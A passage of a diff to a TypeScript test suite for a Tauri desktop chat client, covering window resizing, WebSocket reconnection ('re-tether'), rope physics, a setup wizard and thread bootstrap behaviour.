-      expect(parseFloat(moon.style.left)).toBe(20)
-      expect(pos.x + parseFloat(moon.style.left)).toBe(20) // screen position still preserved
-    })
-
-    it('Scenario: restoreCollapsed returns the moon to 140x185 at its original screen spot', async () => {
-      // First grow (moon at screen 315,215 → envelope), then restore.
-      mockWin(300, 200)
-      await M().TauriService.growToEnvelope()
-      const moon = document.getElementById('moon')!
-      // After grow, window origin is (140,200) and moon CSS (175,15) → screen (315,215).
-      const { setPosition, setSize } = mockWin(140, 200) // outerPosition now reports the grown origin
-      // re-point the moon CSS to what grow left it as (mockWin doesn't touch the DOM)
-      moon.style.left = '175px'; moon.style.top = '15px'
-      await M().TauriService.restoreCollapsed()
-      const pos = setPosition.mock.calls[0][0]
-      // moon screen still (315,215); collapsed moon CSS = (15,15) → origin (300,200)
-      expect({ x: pos.x, y: pos.y }).toEqual({ x: 300, y: 200 })
-      expect(moon.style.left).toBe('') // back to CSS default 15
-      expect(setSize).toHaveBeenCalledWith(expect.objectContaining({ width: 140, height: 185 }))
-      expect(document.body.classList.contains('retethering')).toBe(false)
-    })
-  })
-
-  // ───────────────────────────────────────────────────────────────────────────
-  // Feature: re-tether state machine. Drives the string from the connection
-  // lifecycle: pull → reconnect to the SAME thread; detached-past-grace / stalled
-  // → drop the string (collapsed-only); thread-snapshot → retract + restore.
-  // ───────────────────────────────────────────────────────────────────────────
-  describe('Feature: re-tether state machine', () => {
-    const M = () => (window as any).__MoonInternals
-
-    it('Scenario: pull with the socket DOWN bypasses backoff, cancels the pending reconnect, and connects', () => {
-      const m = M()
-      m.State.ws = null
-      m.State.reconnectAttempts = 5
-      m.State.reconnectTimer = 123 // a pending scheduleReconnect timer
-      const connect = vi.spyOn(m.WebSocketEngine, 'connect').mockImplementation(() => {})
-      m.WebSocketEngine.reTether()
-      expect(m.State.reconnectAttempts).toBe(0)
-      expect(connect).toHaveBeenCalledTimes(1)
-      expect(m.State.reconnectTimer).toBeNull() // no orphaned second socket
-    })
-
-    it('Scenario: pull with the socket OPEN re-subscribes to the SAME thread (never new-thread)', () => {
-      const m = M()
-      m.State.ws = { readyState: WebSocket.OPEN, send: vi.fn() }
-      m.State.activeThreadId = 'thread-keep'
-      const send = vi.spyOn(m.WebSocketEngine, 'send').mockImplementation(() => {})
-      vi.spyOn(m.WebSocketEngine, 'connect').mockImplementation(() => {})
-      m.WebSocketEngine.reTether()
-      expect(send).toHaveBeenCalledWith({ type: 'subscribe', threadId: 'thread-keep' })
-      expect(send).not.toHaveBeenCalledWith({ type: 'new-thread' })
-      expect(m.State.subscribeTimeout).not.toBeNull() // watchdog re-armed
-    })
-
-    it('Scenario: showTether drops the string when collapsed (grow envelope → show)', async () => {
-      const m = M()
-      document.getElementById('chat-panel')!.classList.remove('active')
-      vi.spyOn(m.MoonString, 'isLive').mockReturnValue(false)
-      const grow = vi.spyOn(m.TauriService, 'growToEnvelope').mockResolvedValue(undefined)
-      const show = vi.spyOn(m.MoonString, 'show').mockImplementation(() => {})
-      m.WebSocketEngine.showTether()
-      expect(grow).toHaveBeenCalledTimes(1)
-      await Promise.resolve(); await Promise.resolve() // flush the .then(show)
-      expect(show).toHaveBeenCalledTimes(1)
-      expect(m.State.tetherPendingOnCollapse).toBe(false)
-    })
-
-    it('Scenario: showTether DEFERS while the chat is open (string is collapsed-only)', () => {
-      const m = M()
-      document.getElementById('chat-panel')!.classList.add('active')
-      const grow = vi.spyOn(m.TauriService, 'growToEnvelope').mockResolvedValue(undefined)
-      m.WebSocketEngine.showTether()
-      expect(grow).not.toHaveBeenCalled()
-      expect(m.State.tetherPendingOnCollapse).toBe(true)
-    })
-
-    it('Scenario: a reconnect landing mid-grow abandons the string AND restores the window (tetherGen epoch)', async () => {
-      const m = M()
-      document.getElementById('chat-panel')!.classList.remove('active')
-      vi.spyOn(m.MoonString, 'isLive').mockReturnValue(false)
-      // growToEnvelope() resolves only when WE say so — this models the several-IPC
-      // round-trip gap during which a background reconnect can succeed.
-      let resolveGrow: () => void = () => {}
-      const grow = vi
-        .spyOn(m.TauriService, 'growToEnvelope')
-        .mockReturnValue(new Promise<void>((r) => { resolveGrow = r }))
-      const restore = vi.spyOn(m.TauriService, 'restoreCollapsed').mockResolvedValue(undefined)
-      const show = vi.spyOn(m.MoonString, 'show').mockImplementation(() => {})
-
-      m.WebSocketEngine.showTether()          // arms the grow, stamps tetherGen
-      expect(grow).toHaveBeenCalledTimes(1)
-
-      // reconnect wins the race. onReattached suspends at `await growPromise`, so it
-      // must NOT be awaited before we resolve the grow (that would deadlock).
-      const reattached = m.WebSocketEngine.onReattached()
-      expect(restore).not.toHaveBeenCalled()  // restore is sequenced AFTER the grow settles
-      resolveGrow()                           // grow finishes a beat too late
-      await reattached                         // → grow settled → restore awaited
-      expect(show).not.toHaveBeenCalled()     // string abandoned, not popped out post-reconnect
-      expect(restore).toHaveBeenCalledTimes(1) // ...and the window was collapsed back (no orphan)
-    })
-
-    it('Scenario: a NEW tether episode during cleanup is not clobbered (epoch guards the restore)', async () => {
-      const m = M()
-      document.getElementById('chat-panel')!.classList.remove('active')
-      vi.spyOn(m.MoonString, 'isLive').mockReturnValue(false)
-      vi.spyOn(m.MoonString, 'show').mockImplementation(() => {})
-      let resolveGrow1: () => void = () => {}
-      vi.spyOn(m.TauriService, 'growToEnvelope')
-        .mockReturnValueOnce(new Promise<void>((r) => { resolveGrow1 = r })) // episode 1 (pending)
-        .mockReturnValue(Promise.resolve())                                  // episode 2 grow
-      const restore = vi.spyOn(m.TauriService, 'restoreCollapsed').mockResolvedValue(undefined)
-
-      m.WebSocketEngine.showTether()           // episode 1 grow (pending)
-      const reattached = m.WebSocketEngine.onReattached() // suspends awaiting episode-1 grow
-      m.WebSocketEngine.showTether()           // a fresh disconnect → episode 2 → bumps tetherGen
-      resolveGrow1()                           // episode-1 grow finally settles
-      await reattached
-      expect(restore).not.toHaveBeenCalled()   // episode 1's restore stood down; episode 2 owns the window
-    })
-
-    it('Scenario: opening the chat ENDS the tether episode — a later reconnect cannot shrink the OPEN chat (regression)', async () => {
-      const m = M()
-      document.getElementById('chat-panel')!.classList.remove('active')
-      // Live-state tracked through the real show/hideImmediate call order, so the
-      // chat-open teardown path is exercised exactly as production wires it.
-      let live = false
-      vi.spyOn(m.MoonString, 'isLive').mockImplementation(() => live)
-      const show = vi.spyOn(m.MoonString, 'show').mockImplementation(() => { live = true })
-      vi.spyOn(m.MoonString, 'hideImmediate').mockImplementation(() => { live = false })
-      vi.spyOn(m.TauriService, 'growToEnvelope').mockResolvedValue(undefined)
-      const restore = vi.spyOn(m.TauriService, 'restoreCollapsed').mockResolvedValue(undefined)
-
-      m.WebSocketEngine.showTether()           // string drops while collapsed
-      await Promise.resolve(); await Promise.resolve()
-      expect(show).toHaveBeenCalledTimes(1)    // grow settled → string is out
-
-      // User opens the chat while the string is out (quick moon click).
-      const moon = document.getElementById('moon')!
-      moon.dispatchEvent(new MouseEvent('pointerdown', { bubbles: true, clientX: 100, clientY: 100 }))
-      vi.advanceTimersByTime(50)
-      moon.dispatchEvent(new MouseEvent('pointerup', { bubbles: true, clientX: 100, clientY: 100 }))
-      for (let i = 0; i < 10; i++) await Promise.resolve() // flush toggleChat's await chain
-      expect(document.getElementById('chat-panel')!.classList.contains('active')).toBe(true)
-      expect(restore).toHaveBeenCalledTimes(1) // teardown restored the envelope as part of the open
-      expect(m.State.growPromise).toBeNull()   // episode bookkeeping fully cleared
-
-      // The background reconnect lands AFTER the chat is open. Before the fix, the
-      // dangling growPromise made this replay restoreCollapsed() — shrinking the
-      // user's open chat window to 140x185 mid-use.
-      restore.mockClear()
-      await m.WebSocketEngine.onReattached()
-      expect(restore).not.toHaveBeenCalled()
-    })
-
-    it('Scenario: opening the chat MID-GROW abandons the deferred string (no string pop over the open chat)', async () => {
-      const m = M()
-      document.getElementById('chat-panel')!.classList.remove('active')
-      let live = false
-      vi.spyOn(m.MoonString, 'isLive').mockImplementation(() => live)
-      const show = vi.spyOn(m.MoonString, 'show').mockImplementation(() => { live = true })
-      vi.spyOn(m.MoonString, 'hideImmediate').mockImplementation(() => { live = false })
-      let resolveGrow: () => void = () => {}
-      vi.spyOn(m.TauriService, 'growToEnvelope')
-        .mockReturnValue(new Promise<void>((r) => { resolveGrow = r }))
-      vi.spyOn(m.TauriService, 'restoreCollapsed').mockResolvedValue(undefined)
-
-      m.WebSocketEngine.showTether()           // grow in flight; string NOT yet shown
-
-      // User opens the chat before the grow settles. The open path must bump the
-      // epoch so the deferred MoonString.show() stands down — before the fix the
-      // teardown branch was skipped entirely (isLive() still false) and the string
-      // popped out OVER the open chat once the grow resolved.
-      const moon = document.getElementById('moon')!
-      moon.dispatchEvent(new MouseEvent('pointerdown', { bubbles: true, clientX: 100, clientY: 100 }))
-      vi.advanceTimersByTime(50)
-      moon.dispatchEvent(new MouseEvent('pointerup', { bubbles: true, clientX: 100, clientY: 100 }))
-      for (let i = 0; i < 10; i++) await Promise.resolve()
-
-      resolveGrow()                            // grow finally settles, a beat too late
-      for (let i = 0; i < 10; i++) await Promise.resolve()
-      expect(document.getElementById('chat-panel')!.classList.contains('active')).toBe(true)
-      expect(show).not.toHaveBeenCalled()       // deferred show abandoned (epoch bumped)
-      expect(m.State.growPromise).toBeNull()
-      expect(m.State.tetherPendingOnCollapse).toBe(true) // string returns on the next collapse
-    })
-
-    it('Scenario: a thread-snapshot retracts a live string (with pulse) and clears the grace timer', () => {
-      const m = M()
-      ;(window as any).__TAURI__.core = { invoke: vi.fn().mockResolvedValue(undefined) }
-      m.State.ws = { readyState: WebSocket.OPEN, send: vi.fn() }
-      m.State.activeThreadId = 'abc'
-      m.State.tetherGraceTimer = 999
-      vi.spyOn(m.MoonString, 'isLive').mockReturnValue(true)
-      const retract = vi.spyOn(m.MoonString, 'retract').mockImplementation(() => {})
-      m.handleFrame({ type: 'thread-snapshot', messages: [] })
-      expect(retract).toHaveBeenCalledWith(true)
-      expect(m.State.tetherGraceTimer).toBeNull()
-      expect(document.getElementById('connection-status')!.className).toBe('connected')
-    })
-
-    it('Scenario: a PULL wraps the string into the moon IMMEDIATELY — retract fires before any thread-snapshot (string-demo behavior)', () => {
-      const m = M()
-      m.State.ws = { readyState: WebSocket.OPEN, send: vi.fn() }
-      m.State.activeThreadId = 'thread-keep'
-      m.State.growPromise = Promise.resolve()  // the showTether grow that put the string out
-      vi.spyOn(m.WebSocketEngine, 'send').mockImplementation(() => {})
-      vi.spyOn(m.MoonString, 'isLive').mockReturnValue(true)
-      const retract = vi.spyOn(m.MoonString, 'retract').mockImplementation(() => {})
-      m.WebSocketEngine.reTether()             // the pull gesture — NO snapshot has arrived
-      expect(retract).toHaveBeenCalledWith(true)
-      // The retract's onRetracted hook owns the window restore now; the stashed
-      // grow promise must be dropped or onReattached would restore a second time.
-      expect(m.State.growPromise).toBeNull()
-    })
-
-    it('Scenario: after a pull-retract has finished, onReattached is just the status flip (no second restore, no second retract)', async () => {
-      const m = M()
-      m.State.growPromise = null               // reTether dropped it at pull time
-      vi.spyOn(m.MoonString, 'isLive').mockReturnValue(false) // retract already finished
-      const retract = vi.spyOn(m.MoonString, 'retract').mockImplementation(() => {})
-      const restore = vi.spyOn(m.TauriService, 'restoreCollapsed').mockResolvedValue(undefined)
-      await m.WebSocketEngine.onReattached()
-      expect(retract).not.toHaveBeenCalled()
-      expect(restore).not.toHaveBeenCalled()   // onRetracted already collapsed the window
-      expect(document.getElementById('connection-status')!.className).toBe('connected')
-    })
-  })
-
-  // ── Window-drag rope physics + click-through region ───────────────────────
-  // Dragging the WINDOW fires no JS pointer events (native drag), so onMoved
-  // deltas are injected into the rope as apparent velocity; and while the
-  // string is live the webview publishes the clickable region (moon + rope)
-  // so the Rust cursor poll can make the empty envelope click-through.
-  // jsdom can't run the rAF loop or the Rust poll — these test the contracts:
-  // the velocity-injection math and the region-publish lifecycle.
-  describe('Feature: window-drag rope physics + click-through region', () => {
+  describe('Feature: thread bootstrap (window owns the thread)', () => {
     const M = () => (window as any).__MoonInternals
 
     beforeEach(() => {
-      // No-op rAF: these tests call the REAL MoonString.show(), whose loop
-      // re-arms rAF every frame — the SYNCHRONOUS rAF leaked by the frame-
-      // pipeline suite would recurse it into a stack overflow. A no-op also
-      // freezes the physics, so points move ONLY via the injection under test.
-      ;(window as any).requestAnimationFrame = () => 0
+      ;(window as any).requestAnimationFrame = (cb: FrameRequestCallback) => { cb(0); return 1 }
       ;(window as any).cancelAnimationFrame = () => {}
+      M().ChatState.reset()
+      M().State.activeThreadId = null
+      M().State.pendingUserMessage = null
     })
 
-    function stubInvoke() {
-      const invoke = vi.fn().mockResolvedValue(undefined)
-      ;(window as any).__TAURI__.core = { invoke }
-      return invoke
-    }
-
-    it('Scenario: a window move shifts FREE points as velocity (positions move, prev-positions stay, anchor pinned)', () => {
-      const m = M()
-      stubInvoke()
-      m.MoonString.show()
-      const before = m.MoonString.getPoints()
-      expect(before.length).toBeGreaterThan(2)
-
-      m.MoonString.injectWindowDelta(50, 20)   // window dragged +50,+20 logical px
-
-      const after = m.MoonString.getPoints()
-      // Anchor (i=0) stays pinned to the moon — never shifted by the inject.
-      expect(after[0].x).toBe(before[0].x)
-      expect(after[0].y).toBe(before[0].y)
-      for (let i = 1; i < after.length; i++) {
-        // Free points trail the window: position shifts opposite the delta...
-        expect(after[i].x - before[i].x).toBeCloseTo(-50, 5)
-        expect(after[i].y - before[i].y).toBeCloseTo(-20, 5)
-        // ...but prev-positions DON'T move, which is what makes Verlet read the
-        // shift as velocity (the swing) instead of a teleport.
-        expect(after[i].px).toBe(before[i].px)
-        expect(after[i].py).toBe(before[i].py)
-      }
+    it('thread-list with threads and no active thread subscribes to the most recent', () => {
+      const sendSpy = vi.spyOn(M().WebSocketEngine, 'send').mockImplementation(() => {})
+      M().handleFrame({ type: 'thread-list', threads: [{ id: 'th-new' }, { id: 'th-old' }] })
+      expect(M().State.activeThreadId).toBe('th-new')
+      expect(sendSpy).toHaveBeenCalledWith({ type: 'subscribe', threadId: 'th-new' })
     })
 
-    it('Scenario: per-event delta is clamped (a coalesced full-screen jump injects a swing, not an explosion)', () => {
-      const m = M()
-      stubInvoke()
-      m.MoonString.show()
-      const before = m.MoonString.getPoints()
-      m.MoonString.injectWindowDelta(1200, -900)  // e.g. paint frozen during drag → one fat delta
-      const after = m.MoonString.getPoints()
-      expect(after[1].x - before[1].x).toBeCloseTo(-80, 5)  // clamped to ±80
-      expect(after[1].y - before[1].y).toBeCloseTo(80, 5)
+    it('thread-list with NO threads auto-creates one (new-thread frame)', () => {
+      const sendSpy = vi.spyOn(M().WebSocketEngine, 'send').mockImplementation(() => {})
+      M().handleFrame({ type: 'thread-list', threads: [] })
+      expect(sendSpy).toHaveBeenCalledWith({ type: 'new-thread' })
     })
 
-    it('Scenario: injection is a no-op when the string is not live', () => {
-      const m = M()
-      stubInvoke()
-      m.MoonString.show()
-      m.MoonString.hideImmediate()             // live=false, points remain
-      const before = m.MoonString.getPoints()
-      m.MoonString.injectWindowDelta(50, 50)
-      expect(m.MoonString.getPoints()).toEqual(before)
+    it('the new-thread frame carries the persisted model pick (luna_model)', () => {
+      localStorage.setItem('luna_model', 'gemini-3-flash')
+      const sendSpy = vi.spyOn(M().WebSocketEngine, 'send').mockImplementation(() => {})
+      M().handleFrame({ type: 'thread-list', threads: [] })
+      expect(sendSpy).toHaveBeenCalledWith({ type: 'new-thread', model: 'gemini-3-flash' })
     })
 
-    it('Scenario: show() publishes the interactive region; hideImmediate() clears it', () => {
-      const m = M()
-      const invoke = stubInvoke()
-      m.MoonString.show()
-      const enable = invoke.mock.calls.find((c: any[]) => c[0] === 'set_interactive_region')
-      expect(enable).toBeTruthy()
-      expect(enable![1].enabled).toBe(true)
-      expect(enable![1].rects).toHaveLength(2)            // moon rect + rope bbox
-      for (const r of enable![1].rects) expect(r).toHaveLength(4)
+    it('an existing active thread ignores a thread-list (no re-subscribe)', () => {
+      M().State.activeThreadId = 'th-current'
+      const sendSpy = vi.spyOn(M().WebSocketEngine, 'send').mockImplementation(() => {})
+      M().handleFrame({ type: 'thread-list', threads: [{ id: 'th-other' }] })
+      expect(sendSpy).not.toHaveBeenCalled()
+      expect(M().State.activeThreadId).toBe('th-current')
+    })
 
-      invoke.mockClear()
-      m.MoonString.hideImmediate()
-      const disable = invoke.mock.calls.find((c: any[]) => c[0] === 'set_interactive_region')
-      expect(disable).toBeTruthy()
-      expect(disable![1].enabled).toBe(false)              // whole window interactive again
+    it('thread-created subscribes and flushes the queued user message after the settle delay', () => {
+      const sendSpy = vi.spyOn(M().WebSocketEngine, 'send').mockImplementation(() => {})
+      M().State.pendingUserMessage = { text: 'queued hello', attachments: undefined }
+      M().handleFrame({ type: 'thread-created', thread: { id: 'th-fresh' } })
+      expect(M().State.activeThreadId).toBe('th-fresh')
+      expect(sendSpy).toHaveBeenCalledWith({ type: 'subscribe', threadId: 'th-fresh' })
+      expect(M().State.pendingUserMessage).toBeNull()  // claimed before the delay
+      vi.advanceTimersByTime(100)
+      expect(sendSpy).toHaveBeenCalledWith(expect.objectContaining({
+        type: 'user-message',
+        threadId: 'th-fresh',
+        text: 'queued hello',
+        client: expect.objectContaining({ name: 'luna-moon' }),
+      }))
     })
   })
 
   // ───────────────────────────────────────────────────────────────────────────
-  // Behavioral Feature: Setup wizard (first-run installer)
+  // Feature: hello extras — build identity, the availableModels cache the
+  // settings.connection panel reads, and the protocol version-skew defence.
   // ───────────────────────────────────────────────────────────────────────────
-  describe('Feature: Setup wizard (first-run installer)', () => {
+  describe('Feature: hello — buildSha + availableModels cache + protocol skew', () => {
     const M = () => (window as any).__MoonInternals
-    const W = () => M().SetupWizard
-    const panel = () => document.getElementById('setup-wizard')!
-    const activeStep = () =>
-      (panel().querySelector('.wizard-step.active') as HTMLElement)?.dataset.step
 
-    function stubCore(handler: (cmd: string, args: any) => any) {
-      const invoke = vi.fn().mockImplementation((cmd: string, args: any) =>
-        Promise.resolve(handler(cmd, args)))
-      ;(window as any).__TAURI__.core = { invoke }
-      return invoke
-    }
-
-    it('Scenario: first run (no stored connection) -> wizard auto-opens', async () => {
-      stubCore((cmd) => (cmd === 'load_connection' ? {} : undefined))
-      await W().maybeAutoOpen()
-      expect(panel().classList.contains('active')).toBe(true)
-      expect(activeStep()).toBe('welcome')
+    beforeEach(() => {
+      ;(window as any).requestAnimationFrame = (cb: FrameRequestCallback) => { cb(0); return 1 }
+      ;(window as any).cancelAnimationFrame = () => {}
+      M().ChatState.reset()
     })
 
-    it('Scenario: a connection already exists -> wizard stays closed and marks setup complete', async () => {
-      stubCore((cmd) => (cmd === 'load_connection' ? { wsUrl: 'ws://10.0.0.5:4753/ui' } : undefined))
-      await W().maybeAutoOpen()
-      expect(panel().classList.contains('active')).toBe(false)
-      expect(localStorage.getItem('luna.moon.setupComplete')).toBe('1')
-    })
-
-    it('Scenario: setup already completed once -> never auto-opens again', async () => {
-      localStorage.setItem('luna.moon.setupComplete', '1')
-      const invoke = stubCore(() => ({}))
-      await W().maybeAutoOpen()
-      expect(panel().classList.contains('active')).toBe(false)
-      expect(invoke).not.toHaveBeenCalled()   // short-circuits before any IPC
-    })
-
-    it('Scenario: outside a real Tauri runtime (no __TAURI__.core) -> auto-open is inert', async () => {
-      await W().maybeAutoOpen()               // shared beforeEach mocks window only, no .core
-      expect(panel().classList.contains('active')).toBe(false)
-    })
-
-    it('Scenario: opening the wizard ENDS a live tether episode — buttons stay clickable (regression)', async () => {
-      // First run is always disconnected, so the string episode is the COMMON
-      // first-run state: it flips everything outside the moon+rope rects
-      // native-click-through. If the wizard opens without tearing it down,
-      // every wizard button paints fine and is dead to real clicks.
-      stubCore(() => undefined)
-      document.getElementById('chat-panel')!.classList.remove('active')
-      let live = false
-      vi.spyOn(M().MoonString, 'isLive').mockImplementation(() => live)
-      const show = vi.spyOn(M().MoonString, 'show').mockImplementation(() => { live = true })
-      const hide = vi.spyOn(M().MoonString, 'hideImmediate').mockImplementation(() => { live = false })
-      vi.spyOn(M().TauriService, 'growToEnvelope').mockResolvedValue(undefined)
-      const restore = vi.spyOn(M().TauriService, 'restoreCollapsed').mockResolvedValue(undefined)
-
-      M().WebSocketEngine.showTether()         // string drops while collapsed
-      await Promise.resolve(); await Promise.resolve()
-      expect(show).toHaveBeenCalledTimes(1)    // episode live → region owns the window
-
-      await W().open()
-      expect(hide).toHaveBeenCalledTimes(1)    // hideImmediate cleared the click-through region
-      expect(restore).toHaveBeenCalledTimes(1) // envelope restored before the wizard resize
-      expect(M().State.growPromise).toBeNull() // episode bookkeeping fully cleared
-      expect(M().State.tetherPendingOnCollapse).toBe(true) // string returns after the wizard
-      expect(panel().classList.contains('active')).toBe(true)
-    })
-
-    it('Scenario: a disconnect while the wizard is open DEFERS the string drop (no click-through under the wizard)', async () => {
-      stubCore(() => undefined)
-      document.getElementById('chat-panel')!.classList.remove('active')
-      const show = vi.spyOn(M().MoonString, 'show').mockImplementation(() => {})
-      const grow = vi.spyOn(M().TauriService, 'growToEnvelope').mockResolvedValue(undefined)
-      await W().open()
-      M().WebSocketEngine.showTether()         // grace timer fires mid-wizard
-      await Promise.resolve(); await Promise.resolve()
-      expect(grow).not.toHaveBeenCalled()      // no envelope grow under the wizard
-      expect(show).not.toHaveBeenCalled()
-      expect(M().State.tetherPendingOnCollapse).toBe(true)
-    })
-
-    it('Scenario: closing the wizard hands the window to a deferred string instead of a plain collapse', async () => {
-      stubCore(() => undefined)
-      document.getElementById('chat-panel')!.classList.remove('active')
-      const showTether = vi.spyOn(M().WebSocketEngine, 'showTether').mockImplementation(() => {})
-      await W().open()                          // collapsed → _openedMinimized = true
-      M().State.tetherPendingOnCollapse = true  // a drop was deferred meanwhile
-      W().close({ complete: true })
-      vi.advanceTimersByTime(250)
-      expect(showTether).toHaveBeenCalledTimes(1)
-    })
-
-    it('Scenario: Begin -> path step; picking each card routes to its flow; closing marks complete', () => {
-      stubCore(() => undefined)
-      W().open()
-      document.getElementById('wizard-begin')!.click()
-      expect(activeStep()).toBe('path')
-
-      ;(panel().querySelector('[data-path="local"]') as HTMLElement).click()
-      expect(activeStep()).toBe('local')
-      document.getElementById('wizard-local-back')!.click()
-
-      ;(panel().querySelector('[data-path="remote"]') as HTMLElement).click()
-      expect(activeStep()).toBe('remote')
-      document.getElementById('wizard-remote-back')!.click()
-
-      ;(panel().querySelector('[data-path="connect"]') as HTMLElement).click()
-      expect(activeStep()).toBe('connect')
-
-      document.getElementById('wizard-close-x')!.click()
-      expect(panel().classList.contains('active')).toBe(false)
-      expect(localStorage.getItem('luna.moon.setupComplete')).toBe('1')
-    })
-
-    it('Scenario: progress beads track the journey (path=1, config=2, connect=3, done=4)', () => {
-      stubCore(() => undefined)
-      W().open()
-      const beads = () => Array.from(panel().querySelectorAll('.wizard-bead'))
-      expect(beads()[0].classList.contains('active')).toBe(true)
-      W().goTo('path')
-      expect(beads()[1].classList.contains('active')).toBe(true)
-      expect(beads()[0].classList.contains('done')).toBe(true)
-      W().goTo('local')
-      expect(beads()[2].classList.contains('active')).toBe(true)
-      W().goTo('connect')
-      expect(beads()[3].classList.contains('active')).toBe(true)
-      W().goTo('done')
-      expect(beads()[4].classList.contains('active')).toBe(true)
-      expect(beads().slice(0, 4).every((b) => b.classList.contains('done'))).toBe(true)
-    })
-
-    it('Scenario: connect test hears the hello frame -> success status with build identity', async () => {
-      const sockets: any[] = []
-      class FakeWS {
-        url: string
-        onmessage: any; onclose: any; onerror: any
-        constructor(url: string) { this.url = url; sockets.push(this) }
-        close() {}
-      }
-      ;(window as any).WebSocket = FakeWS
-
-      W().open()
-      W().chosenPath = 'connect'
-      W().goTo('connect')
-      const urlInput = document.getElementById('wizard-connect-url') as HTMLInputElement
-      const tokenInput = document.getElementById('wizard-connect-token') as HTMLInputElement
-      urlInput.value = 'ws://moonbase:4753/ui'
-      tokenInput.value = 'sekrit'
-
-      const testPromise = W().runConnectTest()
-      await Promise.resolve()
-      expect(sockets).toHaveLength(1)
-      // The probe carries the token as a query param, like the real engine.
-      expect(sockets[0].url).toBe('ws://moonbase:4753/ui?token=sekrit')
-
-      sockets[0].onmessage({ data: JSON.stringify({ type: 'hello', protocolVersion: 2, buildSha: 'abc1234' }) })
-      const ok = await testPromise
-      expect(ok).toBe(true)
-      const status = document.getElementById('wizard-connect-status')!
-      expect(status.textContent).toContain('Found Luna')
-      expect(status.textContent).toContain('abc1234')
-      expect(status.classList.contains('ok')).toBe(true)
-    })
-
-    it('Scenario: connect test refused (socket closes) -> failure status, finish still possible', async () => {
-      const sockets: any[] = []
-      class FakeWS {
-        onmessage: any; onclose: any; onerror: any
-        constructor(_url: string) { sockets.push(this) }
-        close() {}
-      }
-      ;(window as any).WebSocket = FakeWS
-
-      W().open()
-      ;(document.getElementById('wizard-connect-url') as HTMLInputElement).value = 'ws://nowhere:4753/ui'
-      const testPromise = W().runConnectTest()
-      await Promise.resolve()
-      sockets[0].onclose({ code: 1006 })
-      const ok = await testPromise
-      expect(ok).toBe(false)
-      const status = document.getElementById('wizard-connect-status')!
-      expect(status.classList.contains('fail')).toBe(true)
-    })
-
-    function fakeWsClass(sockets: any[]) {
-      return class FakeWS {
-        url: string
-        onmessage: any; onclose: any; onerror: any; onopen: any
-        readyState = 0
-        constructor(url: string) { this.url = url; sockets.push(this) }
-        close() {}
-        send() {}
-        addEventListener() {}      // WebSocketEngine.connect wires via listeners
-        removeEventListener() {}
-      }
-    }
-
-    it('Scenario: Save & finish verifies the hello FIRST, then persists, reconnects, and celebrates', async () => {
-      const sockets: any[] = []
-      ;(window as any).WebSocket = fakeWsClass(sockets)
-      const invoke = stubCore(() => undefined)
-
-      W().open()
-      ;(document.getElementById('wizard-connect-url') as HTMLInputElement).value = 'ws://moonbase:4753/ui'
-      ;(document.getElementById('wizard-connect-token') as HTMLInputElement).value = 'sekrit'
-
-      const pending = W().finish()
-      // Nothing persisted yet — the probe is still listening.
-      expect(invoke.mock.calls.find((c: any[]) => c[0] === 'save_connection')).toBeFalsy()
-      sockets[0].onmessage({ data: JSON.stringify({ type: 'hello', protocolVersion: 2 }) })
-      await pending
-
-      const saved = invoke.mock.calls.find((c: any[]) => c[0] === 'save_connection')
-      expect(saved).toBeTruthy()
-      expect(saved![1]).toEqual({ url: 'ws://moonbase:4753/ui', token: 'sekrit' })
-      expect(M().State.wsUrl).toBe('ws://moonbase:4753/ui')
-      expect(M().State.wsToken).toBe('sekrit')
-      expect(localStorage.getItem('luna_ws_url')).toBe('ws://moonbase:4753/ui')
-      expect(localStorage.getItem('luna.moon.setupComplete')).toBe('1')
-      expect(activeStep()).toBe('done')
-      // Cross-server thread state was reset, same as a Settings server switch.
-      expect(M().State.skipLastThreadFile).toBe(true)
-    })
-
-    it('Scenario: a setup-mode server surfaces the Claude-login note on the done step', async () => {
-      const sockets: any[] = []
-      ;(window as any).WebSocket = fakeWsClass(sockets)
-      stubCore(() => undefined)
-
-      W().open()
-      W().goTo('connect')
-      ;(document.getElementById('wizard-connect-url') as HTMLInputElement).value = 'ws://127.0.0.1:4753/ui'
-
-      const pending = W().finish()
-      sockets[0].onmessage({ data: JSON.stringify({
-        type: 'hello', protocolVersion: 2,
-        capabilities: { chat: false, setup: true },
-      }) })
-      await pending
-
-      expect(activeStep()).toBe('done')
-      const note = document.getElementById('wizard-done-setup') as HTMLElement
-      expect(note.hidden).toBe(false)
-      expect(note.textContent).toContain('claude setup-token')
-      expect(document.getElementById('wizard-done-title')!.textContent).toContain('one last step')
-    })
-
-    it('Scenario: a chat-ready server keeps the done step clean (no setup note)', async () => {
-      const sockets: any[] = []
-      ;(window as any).WebSocket = fakeWsClass(sockets)
-      stubCore(() => undefined)
-
-      W().open()
-      W().goTo('connect')
-      ;(document.getElementById('wizard-connect-url') as HTMLInputElement).value = 'ws://127.0.0.1:4753/ui'
-
-      const pending = W().finish()
-      sockets[0].onmessage({ data: JSON.stringify({
-        type: 'hello', protocolVersion: 2,
-        capabilities: { chat: true, setup: false },
-      }) })
-      await pending
-
-      expect(activeStep()).toBe('done')
-      expect((document.getElementById('wizard-done-setup') as HTMLElement).hidden).toBe(true)
-      expect(document.getElementById('wizard-done-title')!.textContent).toBe('Luna is tethered')
-    })
-
-    it('Scenario: failed probe blocks the save; the button re-arms as an explicit "Save anyway"', async () => {
-      const sockets: any[] = []
-      ;(window as any).WebSocket = fakeWsClass(sockets)
-      const invoke = stubCore(() => undefined)
-
-      W().open()
-      W().goTo('connect')
-      ;(document.getElementById('wizard-connect-url') as HTMLInputElement).value = 'ws://nowhere:4753/ui'
-
-      const firstClick = W().finish()
-      sockets[0].onclose({ code: 1006 })
-      await firstClick
-
-      // Refused ⇒ nothing saved, button now offers the explicit override.
-      expect(invoke.mock.calls.find((c: any[]) => c[0] === 'save_connection')).toBeFalsy()
-      const finishBtn = document.getElementById('wizard-finish-btn')!
-      expect(finishBtn.textContent).toBe('Save anyway')
-      expect(activeStep()).toBe('connect')
-
-      await W().finish()   // second click: forceSave skips the probe
-      expect(invoke.mock.calls.find((c: any[]) => c[0] === 'save_connection')).toBeTruthy()
-      expect(activeStep()).toBe('done')
-      // Guard resets for the next visitor of the step.
-      expect(finishBtn.textContent).toBe('Save & finish')
-    })
-
-    it('Scenario: a first frame that is NOT hello reads as "not Luna", never success', async () => {
-      const sockets: any[] = []
-      ;(window as any).WebSocket = fakeWsClass(sockets)
-
-      W().open()
-      ;(document.getElementById('wizard-connect-url') as HTMLInputElement).value = 'ws://some-other-service/ws'
-      const testPromise = W().runConnectTest()
-      sockets[0].onmessage({ data: JSON.stringify({ type: 'thread-list', threads: [] }) })
-      const ok = await testPromise
-      expect(ok).toBe(false)
